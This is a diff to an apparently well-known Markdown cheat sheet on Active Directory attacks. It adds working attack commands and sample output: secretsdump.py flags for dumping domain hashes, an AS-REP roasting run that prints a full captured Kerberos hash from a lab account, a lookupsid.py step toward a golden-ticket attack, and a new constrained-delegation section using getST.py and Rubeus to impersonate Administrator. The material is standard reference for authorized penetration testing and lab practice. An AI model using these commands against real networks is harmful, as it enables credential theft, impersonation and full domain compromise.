@@ -49,6 +49,7 @@
     - [Trust relationship between domains](#trust-relationship-between-domains)
     - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
     - [Kerberos Unconstrained Delegation](#kerberos-unconstrained-delegation)
+    - [Kerberos Constrained Delegation](#kerberos-constrained-delegation)
     - [Kerberos Resource Based Constrained Delegation](#kerberos-resource-based-constrained-delegation)
     - [Relay delegation with mitm6](#relay-delegation-with-mitm6)
     - [PrivExchange attack](#privexchange-attack)
@@ -489,9 +490,12 @@ secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
 secretsdump also works remotely
 
 ```java
-./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss
+./secretsdump.py -dc-ip IP AD\administrator@domain -use-vss -pwd-last-set -user-status 
 ./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
 ```
+
+* `-pwd-last-set`: Shows pwdLastSet attribute for each NTDS.DIT account.
+* `-user-status`: Display whether or not the user is disabled.
 
 #### Alternatives - modules
 
@@ -767,6 +771,13 @@ C:\Rubeus> john --wordlist=passwords_kerb.txt hashes.asreproast
 Using `impacket` to get the hash and `hashcat` to crack it.
 
 ```powershell
+# example
+$ python GetNPUsers.py htb.local/svc-alfresco -no-pass
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Getting TGT for svc-alfresco
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7ae561334cd58a56af90f7fbb20bbd4493b6754a57d5ebc08cb7f47ea472ebb7c9ba4260f57c11b664be03191550254e5c77a17518aeabc55f9321bd9f52201df820e130aa0e3f4b0986725fd3a14794433881050eb62d384c4058a407a348a7de2ef0767a99c9df4f85d8eba8ce30a4ad59621c51f8ea8c0d33f33e06bea1d8ff28d7a86fc2010fd7fa45d2fcc2178cb13c1006823aec8a5da10cffcceeb6e978754b0d4976df5cccb4beb9776d5a8f4810153ccc0e1237ec74e6ae61402457c6cfe29bca7c2f62b287f13aff063f5a0a21c728581e43b46d7537b3e776b4
+
 # extract hashes
 root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
@@ -1086,6 +1097,9 @@ Prerequisite:
     ```powershell
     $ Convert-NameToSid target.domain.com\krbtgt
     S-1-5-21-2941561648-383941485-1389968811-502
+
+    # with Impacket
+    lookupsid.py domain/user:password@10.10.10.10
     ```
 - Replace 502 with 519 to represent Enterprise Admins
 - Create golden ticket and attack parent domain. 
@@ -1095,7 +1109,9 @@ Prerequisite:
 
 ### Kerberos Unconstrained Delegation
 
-> The user sends a TGS to access the service, along with their TGT, and then the service can use the user’s TGT to request a TGS for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
+> The user sends a TGS to access the service, along with their TGT, and then the service can use the user's TGT to request a TGS for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html 
+
+:warning: Unconstrained delegation used to be the only option available in Windows 2000
 
 Domain Compromise via DC Print Server and Unconstrained Delegation
 
@@ -1159,6 +1175,34 @@ Then you can use DCsync or another attack : `mimikatz # lsadump::dcsync /user:HA
 
 * Ensure sensitive accounts cannot be delegated
 * Disable the Print Spooler Service
+
+### Kerberos Constrained Delegation
+
+> Request a Kerberos ticket which allows us to exploit delegation configurations, we can once again use Impackets getST.py script, however,
+
+Passing the -impersonate flag and specifying the user we wish to impersonate (any valid username).
+
+```powershell
+# Discover
+$ Get-DomainComputer -TrustedToAuth | select -exp dnshostname
+
+# Find the service 
+$ Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo
+
+# Exploit with Impacket
+$ getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+
+# Exploit with Rubeus
+$ rubeus s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt
+```
+
 
 ### Kerberos Resource Based Constrained Delegation
 
@@ -1527,3 +1571,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c5
 * [Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
 * [A Red Teamer’s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0](https://wald0.com/?p=179)
 * [Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf](https://www.dropbox.com/s/ilzjtlo0vbyu1u0/Carlos%20Garcia%20-%20Rooted2019%20-%20Pentesting%20Active%20Directory%20Forests%20public.pdf?dl=0)
+* [Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
